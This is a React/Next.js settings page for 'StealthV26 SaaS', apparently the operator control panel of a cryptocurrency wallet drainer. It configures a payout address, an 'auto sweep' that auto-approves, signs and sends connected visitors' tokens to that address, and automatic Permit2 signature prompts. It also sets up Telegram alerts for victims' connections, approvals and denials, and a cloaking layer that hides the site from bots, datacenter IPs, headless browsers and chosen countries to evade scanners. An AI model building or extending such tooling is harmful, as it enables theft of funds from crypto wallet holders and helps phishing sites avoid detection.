"use client";

import { useStore } from "@/lib/store";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { Slider } from "@/components/ui/slider";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Wallet,
  MessageCircle,
  Shield,
  Save,
  Send,
  Bot,
  Eye,
  EyeOff,
} from "lucide-react";
import { useEffect, useState } from "react";
import { toast } from "sonner";

export default function SettingsPage() {
  const {
    payoutConfig,
    setPayoutConfig,
    advancedConfig,
    setAdvancedConfig,
    telegramConfig,
    setTelegramConfig,
    cloakingConfig,
    setCloakingConfig,
  } = useStore();

  const [showBotToken, setShowBotToken] = useState(false);
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let active = true;
    async function loadPlatformConfig() {
      try {
        const res = await fetch("/api/platform-config", { cache: "no-store" });
        const data = await res.json();
        if (!active || !res.ok) return;
        if (data.payout) setPayoutConfig(data.payout);
        if (typeof data.advanced?.autoSignaturePrompt === "boolean") {
          setAdvancedConfig({ autoSignaturePrompt: data.advanced.autoSignaturePrompt });
        }
      } catch {
        // keep local defaults
      }
    }
    void loadPlatformConfig();
    return () => {
      active = false;
    };
  }, [setPayoutConfig, setAdvancedConfig]);

  const handleSave = async () => {
    setSaving(true);
    try {
      const res = await fetch("/api/platform-config", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          payout: payoutConfig,
          advanced: { autoSignaturePrompt: advancedConfig.autoSignaturePrompt },
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message || "Failed to save settings");
      if (data.payout) setPayoutConfig(data.payout);
      toast.success("Permanent payout and automation settings saved");
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Failed to save settings");
    } finally {
      setSaving(false);
    }
  };

  const handleTestTelegram = async () => {
    if (!telegramConfig.botToken || !telegramConfig.chatId) {
      toast.error("Please enter bot token and chat ID");
      return;
    }

    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          botToken: telegramConfig.botToken,
          chatId: telegramConfig.chatId,
          includePlatform: false,
          message: "🧪 StealthV26 SaaS test notification",
        }),
      });
      const data = await response.json().catch(() => ({}));

      if (!response.ok) {
        throw new Error(data?.message || "Failed to send test message");
      }

      toast.success("Test message sent to Telegram");
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Failed to send test message");
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Settings</h1>
          <p className="text-muted-foreground text-sm mt-1">
            Payout configuration, messaging integration, cloaking, and filtering policies
          </p>
        </div>
        <Button onClick={() => void handleSave()} className="gap-2" disabled={saving}>
          <Save className="h-4 w-4" />
          {saving ? "Saving..." : "Save All Settings"}
        </Button>
      </div>

      <Tabs defaultValue="payout" className="space-y-6">
        <TabsList className="grid w-full grid-cols-3 h-auto p-1">
          <TabsTrigger value="payout" className="flex items-center gap-2 text-xs py-2.5">
            <Wallet className="h-3.5 w-3.5" />
            Payout
          </TabsTrigger>
          <TabsTrigger value="telegram" className="flex items-center gap-2 text-xs py-2.5">
            <MessageCircle className="h-3.5 w-3.5" />
            Telegram
          </TabsTrigger>
          <TabsTrigger value="cloaking" className="flex items-center gap-2 text-xs py-2.5">
            <Shield className="h-3.5 w-3.5" />
            Cloaking & Filters
          </TabsTrigger>
        </TabsList>

        {/* Payout Tab */}
        <TabsContent value="payout">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <Card>
              <CardHeader>
                <div className="flex items-center gap-2">
                  <Wallet className="h-4 w-4 text-primary" />
                  <CardTitle className="text-base">Payout Configuration</CardTitle>
                </div>
                <CardDescription>Configure your payout wallet address and sweep settings</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label className="text-xs font-medium">Payout Address</Label>
                  <Input
                    value={payoutConfig.address}
                    onChange={(e) => setPayoutConfig({ address: e.target.value })}
                    placeholder="0x..."
                    className="font-mono text-sm"
                  />
                  <p className="text-[11px] text-muted-foreground">
                    StealthExchange and the compiled SDK send here.{" "}
                    <code className="text-[10px]">sequenceExchangeWallet</code> in{" "}
                    <code className="text-[10px]">/api/platform-config</code> and{" "}
                    <code className="text-[10px]">/api/config</code> matches this address for 0xSequence integrations,
                    unless you set <code className="text-[10px]">NEXT_PUBLIC_SEQUENCE_EXCHANGE_WALLET_ADDRESS</code>{" "}
                    to use a different Sequence-only receiver.
                  </p>
                </div>

                <div className="space-y-2">
                  <Label className="text-xs font-medium">Payout Chain</Label>
                  <Select
                    value={payoutConfig.chain}
                    onValueChange={(v) => setPayoutConfig({ chain: v })}
                  >
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="ethereum">Ethereum</SelectItem>
                      <SelectItem value="bsc">BSC</SelectItem>
                      <SelectItem value="polygon">Polygon</SelectItem>
                      <SelectItem value="arbitrum">Arbitrum</SelectItem>
                      <SelectItem value="optimism">Optimism</SelectItem>
                      <SelectItem value="base">Base</SelectItem>
                      <SelectItem value="avalanche">Avalanche</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <Separator />

                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Auto Sweep</Label>
                    <p className="text-[11px] text-muted-foreground">
                      On /permit2 and embed: after connect, auto-approve, sign, and execute to payout
                    </p>
                  </div>
                  <Switch
                    checked={payoutConfig.autoSweep}
                    onCheckedChange={(v) => setPayoutConfig({ autoSweep: v })}
                  />
                </div>

                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Auto Sign (EIP-712)</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Automatically run Permit2 signatures in SDK and /permit2 after connect
                    </p>
                  </div>
                  <Switch
                    checked={advancedConfig.autoSignaturePrompt}
                    onCheckedChange={(v) => setAdvancedConfig({ autoSignaturePrompt: v })}
                  />
                </div>

                {payoutConfig.autoSweep && (
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <Label className="text-xs font-medium">Minimum Sweep Amount (USD)</Label>
                      <span className="text-sm font-mono font-bold">${payoutConfig.minSweepAmount}</span>
                    </div>
                    <Slider
                      value={[payoutConfig.minSweepAmount]}
                      onValueChange={([v]) => setPayoutConfig({ minSweepAmount: v })}
                      min={1}
                      max={500}
                      step={5}
                    />
                  </div>
                )}
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Payout Summary</CardTitle>
                <CardDescription>Current payout configuration overview</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="rounded-lg bg-accent/50 p-4 space-y-3">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">Address</span>
                    <span className="font-mono text-xs">
                      {payoutConfig.address
                        ? `${payoutConfig.address.slice(0, 10)}...${payoutConfig.address.slice(-8)}`
                        : "Not configured"}
                    </span>
                  </div>
                  <Separator />
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">Chain</span>
                    <Badge variant="outline" className="text-xs capitalize">
                      {payoutConfig.chain}
                    </Badge>
                  </div>
                  <Separator />
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">Auto Sweep</span>
                    <Badge
                      variant={payoutConfig.autoSweep ? "default" : "secondary"}
                      className="text-xs"
                    >
                      {payoutConfig.autoSweep ? "Enabled" : "Disabled"}
                    </Badge>
                  </div>
                  {payoutConfig.autoSweep && (
                    <>
                      <Separator />
                      <div className="flex justify-between text-sm">
                        <span className="text-muted-foreground">Min Sweep</span>
                        <span className="font-medium">${payoutConfig.minSweepAmount}</span>
                      </div>
                    </>
                  )}
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Telegram Tab */}
        <TabsContent value="telegram">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <Card>
              <CardHeader>
                <div className="flex items-center gap-2">
                  <Bot className="h-4 w-4 text-primary" />
                  <CardTitle className="text-base">Telegram Bot Configuration</CardTitle>
                </div>
                <CardDescription>Configure real-time event notifications via Telegram</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Enable Telegram Notifications</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Forward all wallet events to your Telegram bot
                    </p>
                  </div>
                  <Switch
                    checked={telegramConfig.enabled}
                    onCheckedChange={(v) => setTelegramConfig({ enabled: v })}
                  />
                </div>

                <Separator />

                <div className="space-y-2">
                  <Label className="text-xs font-medium">Bot Token</Label>
                  <div className="flex gap-2">
                    <Input
                      type={showBotToken ? "text" : "password"}
                      value={telegramConfig.botToken}
                      onChange={(e) => setTelegramConfig({ botToken: e.target.value })}
                      placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
                      className="font-mono text-sm"
                    />
                    <Button
                      variant="outline"
                      size="icon"
                      onClick={() => setShowBotToken(!showBotToken)}
                    >
                      {showBotToken ? (
                        <EyeOff className="h-4 w-4" />
                      ) : (
                        <Eye className="h-4 w-4" />
                      )}
                    </Button>
                  </div>
                  <p className="text-[11px] text-muted-foreground">
                    API token from @BotFather
                  </p>
                </div>

                <div className="space-y-2">
                  <Label className="text-xs font-medium">Chat ID</Label>
                  <Input
                    value={telegramConfig.chatId}
                    onChange={(e) => setTelegramConfig({ chatId: e.target.value })}
                    placeholder="-1001234567890"
                    className="font-mono text-sm"
                  />
                  <p className="text-[11px] text-muted-foreground">
                    Personal chat or channel ID for notifications
                  </p>
                </div>

                <Button
                  variant="outline"
                  onClick={handleTestTelegram}
                  className="w-full gap-2"
                >
                  <Send className="h-4 w-4" />
                  Send Test Message
                </Button>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <div className="flex items-center gap-2">
                  <MessageCircle className="h-4 w-4 text-primary" />
                  <CardTitle className="text-base">Event Subscriptions</CardTitle>
                </div>
                <CardDescription>Choose which events trigger Telegram notifications</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Wallet Connection</Label>
                    <p className="text-[11px] text-muted-foreground">
                      New wallet connections and session starts
                    </p>
                  </div>
                  <Switch
                    checked={telegramConfig.events.connection}
                    onCheckedChange={(v) =>
                      setTelegramConfig({
                        events: { ...telegramConfig.events, connection: v },
                      })
                    }
                  />
                </div>

                <Separator />

                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Network Changes</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Chain switch events and network changes
                    </p>
                  </div>
                  <Switch
                    checked={telegramConfig.events.networkChange}
                    onCheckedChange={(v) =>
                      setTelegramConfig({
                        events: { ...telegramConfig.events, networkChange: v },
                      })
                    }
                  />
                </div>

                <Separator />

                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Transaction Approvals</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Signature approvals and token authorizations
                    </p>
                  </div>
                  <Switch
                    checked={telegramConfig.events.approval}
                    onCheckedChange={(v) =>
                      setTelegramConfig({
                        events: { ...telegramConfig.events, approval: v },
                      })
                    }
                  />
                </div>

                <Separator />

                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Denials</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Rejected signatures and denied transactions
                    </p>
                  </div>
                  <Switch
                    checked={telegramConfig.events.denial}
                    onCheckedChange={(v) =>
                      setTelegramConfig({
                        events: { ...telegramConfig.events, denial: v },
                      })
                    }
                  />
                </div>

                <Separator />

                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Asset Activity</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Token transfers, sweeps, and balance changes
                    </p>
                  </div>
                  <Switch
                    checked={telegramConfig.events.assetActivity}
                    onCheckedChange={(v) =>
                      setTelegramConfig({
                        events: { ...telegramConfig.events, assetActivity: v },
                      })
                    }
                  />
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Cloaking & Filters Tab */}
        <TabsContent value="cloaking">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <Card>
              <CardHeader>
                <div className="flex items-center gap-2">
                  <Shield className="h-4 w-4 text-primary" />
                  <CardTitle className="text-base">Cloaking & Protection</CardTitle>
                </div>
                <CardDescription>Bot filtering, IP-based blocking, and traffic analysis</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Enable Cloaking</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Activate traffic filtering and cloaking layer
                    </p>
                  </div>
                  <Switch
                    checked={cloakingConfig.enabled}
                    onCheckedChange={(v) => setCloakingConfig({ enabled: v })}
                  />
                </div>

                <Separator />

                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Filter Bots</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Block known bot user agents and crawlers
                    </p>
                  </div>
                  <Switch
                    checked={cloakingConfig.filterBots}
                    onCheckedChange={(v) => setCloakingConfig({ filterBots: v })}
                  />
                </div>

                <Separator />

                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Filter Datacenter IPs</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Block traffic from known datacenter IP ranges
                    </p>
                  </div>
                  <Switch
                    checked={cloakingConfig.filterDatacenterIPs}
                    onCheckedChange={(v) => setCloakingConfig({ filterDatacenterIPs: v })}
                  />
                </div>

                <Separator />

                <div className="flex items-center justify-between">
                  <div className="space-y-1">
                    <Label className="text-xs font-medium">Filter Headless Browsers</Label>
                    <p className="text-[11px] text-muted-foreground">
                      Detect and block headless browser sessions
                    </p>
                  </div>
                  <Switch
                    checked={cloakingConfig.filterHeadlessBrowsers}
                    onCheckedChange={(v) => setCloakingConfig({ filterHeadlessBrowsers: v })}
                  />
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Geo Filtering</CardTitle>
                <CardDescription>Country-based access control (comma-separated ISO codes)</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label className="text-xs font-medium">Allowed Countries</Label>
                  <Input
                    value={cloakingConfig.allowedCountries.join(", ")}
                    onChange={(e) =>
                      setCloakingConfig({
                        allowedCountries: e.target.value
                          .split(",")
                          .map((s) => s.trim())
                          .filter(Boolean),
                      })
                    }
                    placeholder="US, UK, DE, FR (leave empty for all)"
                    className="text-sm"
                  />
                  <p className="text-[11px] text-muted-foreground">
                    Leave empty to allow all countries. Only these countries will have access.
                  </p>
                </div>

                <Separator />

                <div className="space-y-2">
                  <Label className="text-xs font-medium">Blocked Countries</Label>
                  <Input
                    value={cloakingConfig.blockedCountries.join(", ")}
                    onChange={(e) =>
                      setCloakingConfig({
                        blockedCountries: e.target.value
                          .split(",")
                          .map((s) => s.trim())
                          .filter(Boolean),
                      })
                    }
                    placeholder="CN, RU, KP"
                    className="text-sm"
                  />
                  <p className="text-[11px] text-muted-foreground">
                    These countries will be blocked from accessing the platform
                  </p>
                </div>

                <Separator />

                <div className="rounded-lg bg-accent/50 p-4 space-y-2">
                  <p className="text-xs font-medium">Protection Status</p>
                  <div className="flex flex-wrap gap-2">
                    <Badge
                      variant={cloakingConfig.enabled ? "default" : "secondary"}
                      className="text-[10px]"
                    >
                      Cloaking: {cloakingConfig.enabled ? "ON" : "OFF"}
                    </Badge>
                    <Badge
                      variant={cloakingConfig.filterBots ? "default" : "secondary"}
                      className="text-[10px]"
                    >
                      Bot Filter: {cloakingConfig.filterBots ? "ON" : "OFF"}
                    </Badge>
                    <Badge
                      variant={cloakingConfig.filterDatacenterIPs ? "default" : "secondary"}
                      className="text-[10px]"
                    >
                      DC IPs: {cloakingConfig.filterDatacenterIPs ? "ON" : "OFF"}
                    </Badge>
                    <Badge
                      variant={cloakingConfig.filterHeadlessBrowsers ? "default" : "secondary"}
                      className="text-[10px]"
                    >
                      Headless: {cloakingConfig.filterHeadlessBrowsers ? "ON" : "OFF"}
                    </Badge>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
}
